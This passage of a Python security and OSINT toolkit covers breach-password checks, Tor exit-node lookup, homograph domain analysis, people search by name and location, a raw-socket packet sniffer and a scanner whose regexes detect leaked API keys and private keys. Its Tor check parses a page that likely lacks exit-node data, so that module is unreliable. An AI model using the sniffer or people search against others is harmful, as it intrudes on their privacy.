                        if hash_suffix == suffix:
                            match_count = int(count_str)
                            break
                print(f"\n{Colors.BOLD}PWNED PASSWORDS AUDIT REPORT:{Colors.RESET}")
                print("-" * 75)
                if match_count > 0:
                    print(f"  Analysis Verdict: {Colors.RED}[!!!] LEAKED STRONGLY EXPOSED{Colors.RESET}")
                    print(f"  Prevalence Count: This exact password string was found {Colors.RED}{match_count}{Colors.RESET} times inside data breaches.")
                    print("  Security Warning: Do not utilize this credential for active online profiles.")
                else:
                    print(f"  Analysis Verdict: {Colors.GREEN}[+] STATUS SECURE // NO KNOWN LEAKS{Colors.RESET}")
                    print("  Prevalence Count: Zero compromised occurrences indexed.")
        except Exception as e:
            print(f"\n{Colors.RED}[!] Failed to update Pwned Passwords threat feed: {e}{Colors.RESET}")
            
    else:
        print(f"{Colors.RED}[!] Invalid choice selected.{Colors.RESET}")
        
    print("-" * 75)
    print(f"\n{Colors.AMBER}Note on Name Queries:{Colors.RESET} Real names are omitted because public breach tracking platforms")
    print("index leaks strictly by unique identifiers (email/username) to ensure privacy and accuracy.")
    input(f"\nPress Enter to return to sub-directory menus...")

def run_threat_intel():

    if ui is not None: ui.section("MODULE 06 // TOR EXIT NODE THREAT INTELLIGENCE NODE VALIDATOR", "cyan")
    else: print(f"\n{Colors.CYAN}[MODULE 06 // TOR EXIT NODE THREAT INTELLIGENCE NODE VALIDATOR]{Colors.RESET}")
    target_ip = (ui.prompt_input("Enter target IP address to check:") if ui is not None else input("\nEnter target IP address to check: ").strip())
    if not target_ip:
        return
        
    print(f"\n{Colors.GREEN}Configuring safe connection stream to torproject.org public network nodes...{Colors.RESET}")
    url = "https://torproject.org"
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
    
    try:
        with urllib.request.urlopen(req, timeout=12) as network_stream:
            raw_text = network_stream.read().decode('utf-8')
            allocated_exit_nodes = set()
            
            for text_row in raw_text.split('\n'):
                if text_row.startswith("ExitAddress"):
                    row_elements = text_row.split()
                    if len(row_elements) > 1:
                        allocated_exit_nodes.add(row_elements[1])
            
            if ui is not None:
                status_label = "[red]THREAT DETECTED — TOR EXIT LAYER GATEWAY[/red]" if target_ip in allocated_exit_nodes else "[green]CLEAN INTERFACE ROUTE[/green]"
                verdict_text = f"Target: {target_ip}  |  Verdict: {status_label}"
                ui.panel(verdict_text, title="VERIFIED THREAT FEED SYNCHRONIZED", border_style="green")
            else:
                print(f"\n{Colors.GREEN}[+] VERIFIED THREAT FEED SYNCHRONIZED{Colors.RESET}")
                print("-" * 70)
                if target_ip in allocated_exit_nodes:
                    print(f"Target Track IP Address: {target_ip}")
                    print(f"Threat Analysis Verdict: {Colors.RED}[!!!] THREAT DETECTED // CONFIRMED TOR EXIT LAYER GATEWAY{Colors.RESET}")
                else:
                    print(f"Target Track IP Address: {target_ip}")
                    print(f"Threat Analysis Verdict: {Colors.GREEN}[+] CLEAN INTERFACE ROUTE{Colors.RESET}")
    except Exception as ex:
        if ui is not None:
            ui.error(f"Failed to capture streaming telemetry metrics from threat source: {ex}")
        else:
            print(f"\n{Colors.RED}[!] Failed to capture streaming telemetry metrics from threat source: {ex}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nModule processing terminated. Press Enter to draw sub-directory menus...")

def run_homograph_analyzer():

    if ui is not None: ui.section("MODULE 08 // IDN HOMOGRAPH PHISHING DOMAIN & PUNYCODE ANALYZER", "cyan", subtitle="Translates string descriptors between Unicode and standard Punycode formats.")
    else:
        print(f"\n{Colors.CYAN}[MODULE 08 // IDN HOMOGRAPH PHISHING DOMAIN & PUNYCODE ANALYZER]{Colors.RESET}")
        print("Translates string descriptors between Unicode and standard Punycode formats.")
    input_domain = (ui.prompt_input("Enter target domain to inspect (e.g., xn--appl-43d.com or apple.com):").lower()
                    if ui is not None
                    else input("\nEnter target domain to inspect (e.g., xn--appl-43d.com or apple.com): ").strip().lower())
    if not input_domain:
        return
        
    print(f"\n{Colors.GREEN}Executing encoding translation matrix checks...{Colors.RESET}")
    print("-" * 75)
    try:
        if input_domain.startswith("xn--") or ".xn--" in input_domain:
            decoded_unicode = input_domain.encode('ascii').decode('idna')
            if ui is not None:
                ui.result_table("HOMOGRAPH ANALYSIS RESULTS", ["FIELD", "VALUE"], [
                    ("Input Type Format", "[yellow]PUNYCODE (Obfuscated String Grid)[/yellow]"),
                    ("Cleartext Unicode Target", f"[green]{decoded_unicode}[/green]"),
                    ("Active Auditing Flag", "[red][!] Relief mapping indicates an international domain proxy mask.[/red]"),
                ], border_style="red")
            else:
                print(f"  -> Input Type Format      : {Colors.AMBER}PUNYCODE (Obfuscated String Grid){Colors.RESET}")
                print(f"  -> Cleartext Unicode Target: {Colors.GREEN}{decoded_unicode}{Colors.RESET}")
                print(f"  -> Active Auditing Flag   : {Colors.RED}[!] Relief mapping indicates an international domain proxy mask.{Colors.RESET}")
        else:
            encoded_punycode = input_domain.encode('idna').decode('ascii')
            if ui is not None:
                flag_text = "[red][!] HOMOGRAPH TARGET: Contains lookalike Unicode characters![/red]" if encoded_punycode != input_domain else "[green][+] CLEAN BASELINE: Native standard ASCII string configuration.[/green]"
                ui.result_table("HOMOGRAPH ANALYSIS RESULTS", ["FIELD", "VALUE"], [
                    ("Input Type Format", "[green]STANDARD ASCII (Cleartext String Grid)[/green]"),
                    ("Compiled Punycode Asset", f"[cyan]{encoded_punycode}[/cyan]"),
                    ("Active Auditing Flag", flag_text),
                ], border_style="cyan")
            else:
                print(f"  -> Input Type Format      : {Colors.GREEN}STANDARD ASCII (Cleartext String Grid){Colors.RESET}")
                print(f"  -> Compiled Punycode Asset : {Colors.CYAN}{encoded_punycode}{Colors.RESET}")
                if encoded_punycode != input_domain:
                    print(f"  -> Active Auditing Flag   : {Colors.RED}[!] HOMOGRAPH TARGET: Contains lookalike Unicode characters!{Colors.RESET}")
                else:
                    print(f"  -> Active Auditing Flag   : {Colors.GREEN}[+] CLEAN BASELINE: Native standard ASCII string configuration.{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"Encoding codec processing failure tracing string blocks: {e}")
        else:
            print(f"{Colors.RED}[!] Encoding codec processing failure tracing string blocks: {e}{Colors.RESET}")
        
    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nAnalysis sequence finished. Press Enter to load submenu options...")


def run_name_search():
    if ui is not None: ui.section("MODULE 09 // NAME DATABASE SEARCH", "cyan", subtitle="Searches public records by full name and approximate location.")
    else: print(f"\n{Colors.CYAN}[MODULE 09 // NAME DATABASE SEARCH]{Colors.RESET}")
    first_name = (ui.prompt_input("First name:") if ui is not None else input("First name: ").strip())
    last_name = (ui.prompt_input("Last name:") if ui is not None else input("Last name: ").strip())
    city = (ui.prompt_input("City (optional):") if ui is not None else input("City (optional): ").strip())
    state = (ui.prompt_input("State / Region (optional):") if ui is not None else input("State / Region (optional): ").strip())
    if not first_name or not last_name:
        if ui is not None: ui.error("First and last name are required.")
        else: print(f"{Colors.RED}[!] First and last name are required.{Colors.RESET}")
        return
    print(f"\n{Colors.GREEN}Searching public records for: {first_name} {last_name}{Colors.RESET}")
    print("-" * 75)
    try:
        import urllib.parse
        import urllib.request
        import json
        query = f"{first_name} {last_name}"
        if city:
            query += f" {city}"
        if state:
            query += f" {state}"
        encoded_query = urllib.parse.quote(query)
        url = f"https://duckduckgo.com/html/?q={encoded_query}+people+search"
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'})
        with urllib.request.urlopen(req, timeout=12) as resp:
            html = resp.read().decode('utf-8', errors='ignore')
        results = re.findall(r'<a[^>]+href="([^"]+)"[^>]*>([^<]+)</a>', html)
        clean_results = []
        seen = set()
        for href, title in results:
            if any(skip in href.lower() for skip in ['duckduckgo.com', 'youtube.com', 'facebook.com/dial']):
                continue
            if href not in seen:
                seen.add(href)
                clean_results.append((title.strip(), href))
            if len(clean_results) >= 10:
                break
        if ui is not None:
            rows = [(title, href) for title, href in clean_results]
            ui.result_table("PUBLIC RECORD SEARCH RESULTS", ["TITLE", "URL"], rows, border_style="green")
        else:
            print(f"\n{Colors.GREEN}Top Results:{Colors.RESET}")
            for i, (title, href) in enumerate(clean_results, 1):
                print(f"  {i}. {Colors.CYAN}{title}{Colors.RESET}")
                print(f"     {Colors.YELLOW}{href}{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"Search failed: {e}")
        else:
            print(f"{Colors.RED}[!] Search failed: {e}{Colors.RESET}")
    print("-" * 75)
    input(f"\nPress Enter to return to sub-directory menus...")


def run_reverse_image_search():
    if ui is not None: ui.section("MODULE 10 // REVERSE IMAGE SEARCH", "cyan", subtitle="Find where an image appears online using reverse search engines.")
    else: print(f"\n{Colors.CYAN}[MODULE 10 // REVERSE IMAGE SEARCH]{Colors.RESET}")
    image_url = (ui.prompt_input("Image URL to search:") if ui is not None else input("Image URL to search: ").strip())
    if not image_url:
        if ui is not None: ui.error("Image URL is required.")
        else: print(f"{Colors.RED}[!] Image URL is required.{Colors.RESET}")
        return
    print(f"\n{Colors.GREEN}Running reverse image search...{Colors.RESET}")
    print("-" * 75)
    try:
        import urllib.parse
        import urllib.request
        tineye_url = f"https://tineye.com/search?url={urllib.parse.quote(image_url, safe='')}"
        google_url = f"https://www.google.com/searchbyimage?image_url={urllib.parse.quote(image_url, safe='')}"
        bing_url = f"https://www.bing.com/images/search?q=imgurl:{urllib.parse.quote(image_url, safe='')}"
        if ui is not None:
            ui.panel(f"Google Lens: {google_url}\nTinEye: {tineye_url}\nBing Visual Search: {bing_url}", title="REVERSE IMAGE SEARCH LINKS", border_style="green")
        else:
            print(f"\n{Colors.GREEN}Open these URLs to perform reverse image search:{Colors.RESET}")
            print(f"  Google Lens:   {Colors.CYAN}{google_url}{Colors.RESET}")
            print(f"  TinEye:        {Colors.CYAN}{tineye_url}{Colors.RESET}")
            print(f"  Bing Visual:   {Colors.CYAN}{bing_url}{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"Search failed: {e}")
        else:
            print(f"{Colors.RED}[!] Search failed: {e}{Colors.RESET}")
    print("-" * 75)
    input(f"\nPress Enter to return to sub-directory menus...")


def run_whois_lookup():
    if ui is not None: ui.section("MODULE 11 // DOMAIN WHOIS LOOKUP", "cyan", subtitle="Retrieve domain registration, ownership, and expiry details.")
    else: print(f"\n{Colors.CYAN}[MODULE 11 // DOMAIN WHOIS LOOKUP]{Colors.RESET}")
    domain = (ui.prompt_input("Domain name (e.g., example.com):") if ui is not None else input("Domain name (e.g., example.com): ").strip())
    if not domain:
        if ui is not None: ui.error("Domain is required.")
        else: print(f"{Colors.RED}[!] Domain is required.{Colors.RESET}")
        return
    print(f"\n{Colors.GREEN}Querying WHOIS for: {domain}{Colors.RESET}")
    print("-" * 75)
    try:
        import whois
        import datetime
        w = whois.whois(domain)
        if ui is not None:
            rows = []
            for field in ['domain_name', 'registrar', 'creation_date', 'expiration_date', 'updated_date', 'status', 'name_servers', 'dnssec', 'registrant_name', 'registrant_organization', 'registrant_country']:
                value = w.get(field)
                if isinstance(value, list):
                    value = ", ".join(str(v) for v in value)
                elif isinstance(value, datetime.datetime):
                    value = value.strftime("%Y-%m-%d %H:%M:%S")
                rows.append((field.replace('_', ' ').title(), str(value) if value else "N/A"))
            ui.result_table("WHOIS RECORD", ["FIELD", "VALUE"], rows, border_style="green")
        else:
            for field in ['domain_name', 'registrar', 'creation_date', 'expiration_date', 'updated_date', 'status', 'name_servers', 'dnssec', 'registrant_name', 'registrant_organization', 'registrant_country']:
                value = w.get(field)
                if isinstance(value, list):
                    value = ", ".join(str(v) for v in value)
                elif isinstance(value, datetime.datetime):
                    value = value.strftime("%Y-%m-%d %H:%M:%S")
                print(f"  {field.replace('_', ' ').title():<25}: {Colors.CYAN}{value if value else 'N/A'}{Colors.RESET}")
    except ImportError:
        if ui is not None:
            ui.error("python-whois package is not installed. Install it with: pip install python-whois")
        else:
            print(f"{Colors.RED}[!] python-whois package is not installed. Install it with: pip install python-whois{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"WHOIS lookup failed: {e}")
        else:
            print(f"{Colors.RED}[!] WHOIS lookup failed: {e}{Colors.RESET}")
    print("-" * 75)
    input(f"\nPress Enter to return to sub-directory menus...")


def run_email_validator():
    if ui is not None: ui.section("MODULE 12 // EMAIL VALIDATOR & MX LOOKUP", "cyan", subtitle="Validate email syntax, domain existence, and MX records.")
    else: print(f"\n{Colors.CYAN}[MODULE 12 // EMAIL VALIDATOR & MX LOOKUP]{Colors.RESET}")
    email = (ui.prompt_input("Email address to validate:") if ui is not None else input("Email address to validate: ").strip())
    if not email or "@" not in email:
        if ui is not None: ui.error("Valid email address is required.")
        else: print(f"{Colors.RED}[!] Valid email address is required.{Colors.RESET}")
        return
    print(f"\n{Colors.GREEN}Validating: {email}{Colors.RESET}")
    print("-" * 75)
    try:
        import re
        import dns.resolver
        domain = email.split("@")[1]
        syntax_valid = bool(re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email))
        mx_records = []
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            mx_records = [(r.exchange.to_text(), r.preference) for r in answers]
            mx_records.sort(key=lambda x: x[1])
        except Exception:
            pass
        if ui is not None:
            rows = [
                ("Email Syntax", "Valid" if syntax_valid else "Invalid"),
                ("Domain", domain),
                ("MX Records Found", str(len(mx_records)) if mx_records else "None"),
            ]
            if mx_records:
                for i, (mx, pref) in enumerate(mx_records[:5], 1):
                    rows.append((f"MX Server {i}", f"{mx} (priority: {pref})"))
            ui.result_table("EMAIL VALIDATION REPORT", ["FIELD", "VALUE"], rows, border_style="green")
        else:
            print(f"  Email Syntax : {Colors.GREEN if syntax_valid else Colors.RED}{'Valid' if syntax_valid else 'Invalid'}{Colors.RESET}")
            print(f"  Domain       : {Colors.CYAN}{domain}{Colors.RESET}")
            print(f"  MX Records   : {Colors.GREEN}{len(mx_records)} found{Colors.RESET}" if mx_records else f"  MX Records   : {Colors.RED}None{Colors.RESET}")
            for i, (mx, pref) in enumerate(mx_records[:5], 1):
                print(f"    {i}. {Colors.CYAN}{mx}{Colors.RESET} (priority: {pref})")
    except ImportError:
        if ui is not None:
            ui.error("dnspython package is not installed. Install it with: pip install dnspython")
        else:
            print(f"{Colors.RED}[!] dnspython package is not installed. Install it with: pip install dnspython{Colors.RESET}")
    except Exception as e:
        if ui is not None:
            ui.error(f"Validation failed: {e}")
        else:
            print(f"{Colors.RED}[!] Validation failed: {e}{Colors.RESET}")
    print("-" * 75)
    input(f"\nPress Enter to return to sub-directory menus...")


def run_traffic_monitor():

    if ui is not None:
        ui.section("MODULE 01 // INBOUND NETWORK PACKET MONITOR ENGINE", "green",
                   subtitle="Decodes real-time inbound packet metrics hitting your network interface adapter cards.")
        ui.panel("[red]ADMIN RISK WARNING[/red]\nRaw socket intercept requires Administrator / Root rights context.",
                 border_style="red")
    else:
        print(f"\n{Colors.GREEN}[MODULE 01 // INBOUND NETWORK PACKET MONITOR ENGINE]{Colors.RESET}")
        print("Decodes real-time inbound packet metrics hitting your network interface adapter cards.")
        print(f"{Colors.RED}[ADMIN RISK WARNING] Raw socket intercept requires Administrator / Root rights context.{Colors.RESET}\n")
    
    if (ui.console.input("[bold yellow]Initialize network socket mirroring operations pipeline? (Y/N): [/bold yellow]").strip().upper()
            if ui is not None else input("Initialize network socket mirroring operations pipeline? (Y/N): ").strip().upper()) != 'Y':
        return

    sys.stdout.flush()
    print()
    auto_geo_lookup = False
    geo_prompt = "Enable automatic IP geolocation lookup for public IPs? (Y/N): "
    if ui is not None:
        geo_answer = ui.console.input(f"[bold yellow]{geo_prompt}[/bold yellow]").strip().upper()
    else:
        geo_answer = input(f"{Colors.BOLD}{geo_prompt}{Colors.RESET}").strip().upper()
    if geo_answer == 'Y':
        auto_geo_lookup = True
        print(f"{Colors.GREEN}[+] Automatic public IP geolocation ENABLED.{Colors.RESET}")
    else:
        print(f"{Colors.CYAN}[*] Automatic geolocation disabled. Public IPs will still be highlighted.{Colors.RESET}")
    sys.stdout.flush()

    async_dns_register = {}
    cache_lock = threading.Lock()

    def resolve_ip_async(ip_address):
        def worker_task():
            try:
                resolved_hostname, _, _ = socket.gethostbyaddr(ip_address)
                with cache_lock:
                    async_dns_register[ip_address] = resolved_hostname
            except Exception:
                with cache_lock:
                    if ip_address.startswith("192.168.") or ip_address.startswith("10.") or ip_address.startswith("172."):
                        async_dns_register[ip_address] = "Internal LAN Gateway Address"
                    elif ip_address == "127.0.0.1":
                        async_dns_register[ip_address] = "Localhost Software Loopback"
                    else:
                        async_dns_register[ip_address] = "Direct Routing Node Provider"
                        
        with cache_lock:
            if ip_address not in async_dns_register:
                async_dns_register[ip_address] = "Tracking Domain Node..."
                threading.Thread(target=worker_task, daemon=True).start()

    geo_cache = {}
    geo_lock = threading.Lock()
    geo_request_times = []
    geo_request_lock = threading.Lock()

    def geo_lookup_async(ip_address):
        def worker():
            try:
                with geo_request_lock:
                    now = time.time()
                    if geo_request_times and now - geo_request_times[-1] < 1.3:
                        time.sleep(1.3 - (now - geo_request_times[-1]))
                    geo_request_times.append(now)
                    if len(geo_request_times) > 50:
                        geo_request_times.pop(0)
                url = f"http://ip-api.com/json/{ip_address}?fields=country,city,isp,org"
                req = urllib.request.Request(url, headers={'User-Agent': 'Mainframe-Traffic-Monitor'})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    data = json.loads(resp.read().decode('utf-8'))
                    if data.get('status') == 'success':
                        geo = f"{data.get('city', 'N/A')}, {data.get('country', 'N/A')} | {data.get('isp', 'N/A')}"
                    else:
                        geo = "Geo Lookup Failed"
                    with geo_lock:
                        geo_cache[ip_address] = geo
            except Exception:
                with geo_lock:
                    geo_cache[ip_address] = "Geo Lookup Failed"
        with geo_lock:
            if ip_address not in geo_cache:
                geo_cache[ip_address] = "Resolving Geo..."
                threading.Thread(target=worker, daemon=True).start()

    def _is_public_ip(ip_str):
        parts = ip_str.split('.')
        if len(parts) != 4:
            return False
        try:
            first = int(parts[0])
            second = int(parts[1])
        except ValueError:
            return False
        if first == 127:
            return False
        if first == 169 and second == 254:
            return False
        if first == 10:
            return False
        if first == 172 and 16 <= second <= 31:
            return False
        if first == 192 and second == 168:
            return False
        return True

    try:
        if os.name == "nt":
            sys_host = socket.gethostname()
            adapter_ip = socket.gethostbyname(sys_host)
            print(f"\n{Colors.GREEN}Binding raw IP network sockets pipeline to interface: {adapter_ip}{Colors.RESET}")
            
            sniffer_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
            sniffer_socket.bind((adapter_ip, 0))
            sniffer_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sniffer_socket.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
        else:
            print(f"\n{Colors.GREEN}Binding generic raw socket interface frame trackers to Unix descriptors...{Colors.RESET}")
            sniffer_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
    except PermissionError:
        print(f"\n{Colors.RED}[!] Privilege Level Error: Active context has insufficient access rights.{Colors.RESET}")
        print("Rectify this by right-clicking your terminal and choosing 'Run as Administrator'.")
        input(f"\nPress Enter to break execution tracking...")
        return
    except Exception as socket_err:
        print(f"\n{Colors.RED}[!] Hardware Link dropped: Socket failure: {socket_err}{Colors.RESET}")
        input(f"\nPress Enter to break execution tracking...")
        return

    legend = " [PUBLIC IPs = RED]"
    if auto_geo_lookup:
        legend += " [GEO AUTO-LOOKUP ENABLED]"
    print(f"\n{Colors.CYAN}Capture Matrix online. Streaming raw traffic frames. Tap Ctrl+C to drop link...{Colors.RESET}{legend}\n")
    print(f"{Colors.BOLD}{'PROTOCOL':<12}{'SOURCE IP':<18}{'RESOLVED IDENTITY / PROV FLAG':<38}{'BUFFER LENGTH'}{Colors.RESET}")
    print("-" * 80)

    try:
        while True:
            raw_packet_bytes = sniffer_socket.recvfrom(65535)[0]
            ipv4_header_bytes = raw_packet_bytes[0:20]
            unpacked_header = struct.unpack('!BBHHHBBH4s4s', ipv4_header_bytes)
            
            protocol_flag = unpacked_header[6]
            source_address_string = socket.inet_ntoa(unpacked_header[8])
            packet_total_length = len(raw_packet_bytes)
            is_public = _is_public_ip(source_address_string)

            with cache_lock:
                identity_mapping = async_dns_register.get(source_address_string, None)

            if identity_mapping is None:
                resolve_ip_async(source_address_string)
                identity_mapping = "Resolving..."

            if auto_geo_lookup and is_public:
                with geo_lock:
                    geo_info = geo_cache.get(source_address_string)
                if geo_info is None:
                    geo_lookup_async(source_address_string)
                elif geo_info not in ("Resolving Geo...", "Geo Lookup Failed"):
                    identity_mapping = f"{identity_mapping} | {geo_info}"
            elif is_public and not auto_geo_lookup:
                if identity_mapping not in ("Resolving...",):
                    identity_mapping = f"{identity_mapping} [PUBLIC]"
            
            if len(identity_mapping) > 35:
                identity_mapping = identity_mapping[:32] + "..."

            if protocol_flag == 6:
                protocol_label, proto_color = "TCP_STREAM", Colors.CYAN
            elif protocol_flag == 17:
                protocol_label, proto_color = "UDP_DATAGRAM", Colors.AMBER
            elif protocol_flag == 1:
                protocol_label, proto_color = "ICMP_ECHO", Colors.GREEN
            else:
                protocol_label, proto_color = f"IP_PROTO-{protocol_flag}", Colors.RESET

            if is_public:
                row_color = Colors.RED if protocol_flag in (6, 17) else Colors.BRIGHT_YELLOW
            else:
                row_color = proto_color

            print(f"{row_color}{protocol_label:<12}{source_address_string:<18}{identity_mapping:<38}{packet_total_length} Bytes{Colors.RESET}")
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.AMBER}[CAPTURE DRIVER PAUSED // CLOSING SOCKET HOOK REGISTRIES]{Colors.RESET}")
        if os.name == "nt":
            try:
                sniffer_socket.ioctl(socket.SIO_RCVALL, socket.RCVALL_OFF)
            except Exception:
                pass
        input(f"\nNetwork data buffer cleared. Press Enter to load utilities deck...")

def run_secret_scanner():

    if ui is not None: ui.section("MODULE 02 // LOCAL DIRECTORY 'SECRET & KEY' LEAK SCANNER", "green")
    else: print(f"\n{Colors.GREEN}[MODULE 02 // LOCAL DIRECTORY 'SECRET & KEY' LEAK SCANNER]{Colors.RESET}")
    target_path = (ui.prompt_input("Enter folder directory path to scan [Default: current folder '.']:", ".")
                   if ui is not None else input("\nEnter folder directory path path to scan [Default = current folder '.']: ").strip() or ".")
    if not os.path.exists(target_path):
        if ui: ui.error("Input Target Exception: Path directory mapping unresolvable.")
        else: print(f"{Colors.RED}[!] Input Target Exception: Path directory mapping unresolvable.{Colors.RESET}")
        time.sleep(1.2)
        return
    if ui is not None: ui.info("Analyzing source data text streams. Filtering compiled binary blocks...")
    else: print(f"\n{Colors.GREEN}Analyzing source data text streams. Filtering compiled binary blocks...{Colors.RESET}\n")
    regex_signature_dictionary = {
        "Google Cloud Access API Key": re.compile(r'AIza[0-9A-Za-z-_]{35}'),
        "Generic Assignment Security Hash": re.compile(r'(?i)(api_key|secret_key|password|private_key)\s*[:=]\s*["\'][0-9a-zA-Z-_]{16,64}["\']'),
        "Private Cryptographic Key Header": re.compile(r'-----BEGIN (RSA|EC|DSA|OPENSSH)? PRIVATE KEY-----'),
        "AWS Cloud Identity Allocation Token Structure": re.compile(r'AKIA[0-9A-Z]{16}')
    }

    discovered_leaks_counter = 0
    ignored_file_extensions = ('.exe', '.dll', '.png', '.jpg', '.jpeg', '.gif', '.zip', '.tar', '.gz', '.pdf', '.mp4', '.pyc')
    ignored_directory_trees = ('.git', '__pycache__', 'venv', '.local', 'node_modules')

    for root, directories, filenames in os.walk(target_path):
        directories[:] = [d for d in directories if d not in ignored_directory_trees]
        for filename in filenames:
            if filename.endswith(ignored_file_extensions):
                continue
            absolute_file_path = os.path.join(root, filename)
            try:
                with open(absolute_file_path, 'r', encoding='utf-8', errors='ignore') as file_reader:
                    for sequence_line_num, cleartext_row in enumerate(file_reader, 1):
                        for signature_label, validation_regex in regex_signature_dictionary.items():
                            regex_match = validation_regex.search(cleartext_row)
                            if regex_match:
                                discovered_leaks_counter += 1
                                captured_raw_string = regex_match.group(0)
                                obfuscated_value = captured_raw_string[:8] + "..." + captured_raw_string[-4:] if len(captured_raw_string) > 12 else "********"
                                print(f"{Colors.RED}[ RISK LEAK DETECTED ]{Colors.RESET} File: {filename} | Line: {sequence_line_num} | Flag: {signature_label} -> {Colors.AMBER}{obfuscated_value}{Colors.RESET}")
            except Exception:
                pass

    print("\n" + "-" * 70)
    print(f"Directory audit finalized. Total exposed storage indicators flagged: {Colors.RED}{discovered_leaks_counter}{Colors.RESET}")
    input(f"\nPress Enter to reset terminal menu systems interface...")

def run_hash_matrix():

    if ui is not None: ui.section("MODULE 03 // CRYPTOGRAPHIC HASH SIGNATURE GENERATOR & ANALYZER", "green")
    else: print(f"\n{Colors.GREEN}[MODULE 03 // CRYPTOGRAPHIC HASH SIGNATURE GENERATOR & ANALYZER]{Colors.RESET}")
    menu_choice = (ui.console.input("[bold cyan]\n  [1] Text -> Hash  |  [2] Identify Hash Type  [Default: 1]: [/bold cyan]").strip() or "1"
                   if ui is not None else (print(" [1] Process Text String into Cryptographic Signatures (Checksums)\n [2] Profile Unknown Hash Formats using Bit-Length Constraints") or input("Select operation mode target (1/2): ").strip()))

    if menu_choice == "1":
        plaintext_input_bytes = input("\nEnter text string to convert: ").encode('utf-8')
        print(f"\n{Colors.BOLD}COMPUTED HASH METRICS:{Colors.RESET}")
        print(f"  MD5 Checksum Payload    : {Colors.CYAN}{hashlib.md5(plaintext_input_bytes).hexdigest()}{Colors.RESET}")
        print(f"  SHA-1 Signature Payload : {Colors.AMBER}{hashlib.sha1(plaintext_input_bytes).hexdigest()}{Colors.RESET}")
        print(f"  SHA-256 Core Checksum   : {Colors.GREEN}{hashlib.sha256(plaintext_input_bytes).hexdigest()}{Colors.RESET}")
    elif menu_choice == "2":
        raw_signature_hash = input("\nEnter unknown hash signature string to verify: ").strip().lower()
        purified_hash_string = "".join(char for char in raw_signature_hash if char.isalnum())
        character_length_metric = len(purified_hash_string)
        
        print(f"\n{Colors.BOLD}TELEMETRY STRUCTURE ANALYSIS REPORT:{Colors.RESET}")
        print(f"  Captured Character Bit-Length: {character_length_metric}")
        
        if character_length_metric == 32:
            print(f"  Isolated Target Type Matrix  : {Colors.CYAN}MD5 Message Digest (128-bit Signature){Colors.RESET}")
        elif character_length_metric == 40:
            print(f"  Isolated Target Type Matrix  : {Colors.AMBER}SHA-1 Secure Algorithm (160-bit Signature){Colors.RESET}")
        elif character_length_metric == 64:
            print(f"  Isolated Target Type Matrix  : {Colors.GREEN}SHA-256 Standard Structure (256-bit Signature){Colors.RESET}")
        else:
            print(f"  Isolated Target Type Matrix  : {Colors.RED}Custom, Compressed, or Multi-Layered Format Hash{Colors.RESET}")
    else:
        print(f"{Colors.RED}[!] Operations Flag Error: Provided variable context is unresolvable.{Colors.RESET}")
        
    print("-" * 70)
    input(f"\nPress Enter to reload menu directory layers...")

def run_system_profiler():

    if ui is not None: ui.section("MODULE 04 // ADVANCED HOST SYSTEM TELEMETRY PROFILER", "green")
    else: print(f"\n{Colors.GREEN}[MODULE 04 // ADVANCED HOST SYSTEM TELEMETRY PROFILER]{Colors.RESET}")
    if ui is not None: ui.info("Extracting environment tracking attributes and kernel parameters...")
    else: print("Extracting environment tracking attributes and kernel parameters...\n")
    time.sleep(0.5)

    os_data = [
        ("Primary OS Layer Name", platform.system()),
        ("Release Build Model", platform.release()),
        ("Kernel Version Build", platform.version()),
        ("Platform Architecture", platform.machine()),
        ("Processor Core Asset", platform.processor()),
    ]
    if ui is not None:
        ui.result_table("OS CORE METRICS", ["ATTRIBUTE", "VALUE"], os_data, border_style="cyan")
    else:
        print(f"{Colors.BOLD}OS CORE METRICS:{Colors.RESET}")
        for label, val in os_data:
            print(f"  {label:<22}: {val}")
    
    if ui is not None:
        ui.rule_header("NETWORK INTERFACE HARDWARE PROFILE", "cyan")
    else:
        print(f"\n{Colors.BOLD}NETWORK INTERFACE HARDWARE PROFILE:{Colors.RESET}")
    try:
        network_host_identifier = socket.gethostname()
        primary_interface_ip = socket.gethostbyname(network_host_identifier)
        if ui is not None:
            ui.result_table("NETWORK INTERFACE", ["ATTRIBUTE", "VALUE"],
                            [("Console Hostname Tag", network_host_identifier),
                             ("Primary Interface IP", primary_interface_ip)], border_style="cyan")
        else:
            print(f"  Console Hostname Tag : {network_host_identifier}")
            print(f"  Primary Interface IP : {primary_interface_ip}")
    except Exception as telemetry_error:
        if ui is not None:
            ui.error(f"Failed to capture hardware device descriptors: {telemetry_error}")
        else:
            print(f"  Failed to capture hardware device descriptors: {telemetry_error}")

    if ui is not None:
        ui.pause("Press Enter to return")
    else:
        input(f"\nTelemetry collection phase finished. Press Enter to load submenu options...")

def run_base64_matrix():

    if ui is not None: ui.section("MODULE 05 // BASE64 DATA PARSING & CODEC MATRIX", "green")
    else: print(f"\n{Colors.GREEN}[MODULE 05 // BASE64 DATA PARSING & CODEC MATRIX]{Colors.RESET}")
    print(" [E] Encode Cleartext Variables into Standard Base64 String Format")
    print(" [D] Decode Base64 Obfuscated Format Arrays into Cleartext Strings")
    operational_flag = (ui.console.input("[bold yellow]Select processing flag (E/D): [/bold yellow]").strip().upper()
                         if ui is not None
                         else input("Select processing configuration flag (E/D): ").strip().upper())
    
    if operational_flag == 'E':
        cleartext_string_input = input("\nEnter raw text data string to transform: ")
        converted_base64_bytes = base64.b64encode(cleartext_string_input.encode('utf-8'))
        if ui is not None:
            ui.panel(converted_base64_bytes.decode('utf-8'), title="Transformation Complete", border_style="green")
        else:
